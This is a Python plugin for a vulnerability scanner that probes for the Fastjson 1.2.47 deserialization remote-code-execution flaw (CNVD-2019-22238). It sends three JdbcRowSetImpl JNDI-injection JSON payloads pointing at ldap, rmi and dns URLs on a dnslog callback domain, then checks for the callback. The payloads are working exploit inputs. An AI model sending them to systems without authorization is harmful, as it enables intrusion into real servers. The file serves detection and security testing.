#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Fastjson <=1.2.47 反序列化
    CNVD-2019-22238
        Payload: https://vulhub.org/#/environments/fastjson/1.2.47-rce/

fastjson <= 1.2.47 反序列化漏洞
'''

from lib.api.dns import dns
from lib.tool.md5 import random_md5
from PluginManager import Vuln_Scan

class Scan(Vuln_Scan):
    def __init__(self):
        self.payloads = [
            {'data': '''{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://DNSDOMAIN/0333","autoCommit":true}}'''},
            {'data': '''{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://DNSDOMAIN/c1d1","autoCommit":true}}'''},
            {'data': '''{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"dns://DNSDOMAIN/b152","autoCommit":true}}'''},
        ]
    
    def POC(self, clients):
        client = clients.get('reqClient')
        sessid = '7741b152f4f34cf03332b54c1d1f4320'

        vul_info = {
            'app_name': 'Fastjson',
            'vul_type': 'RCE',
            'vul_id': 'CNVD-2019-22238',
        }

        headers = {
            'Content-Type': 'application/json'
        }

        for payload in self.payloads:               # * Payload
            md = random_md5()                                       # * 随机md5值, 8位
            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

            data = payload['data'].replace('DNSDOMAIN', dns_domain) # * Data

            res = client.request(
                'post',
                '',
                data=data,
                headers=headers,
                vul_info=vul_info
            )
            if res is None:
                continue

            if (dns.result(md, sessid)):
                results = {
                    'Target': res.request.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        return None
    
    def EXP(self, clients):
        pass

    def Start(self, clients):
        return self.POC(clients)


def cnvd_2019_22238_scan(clients):
    '''  '''
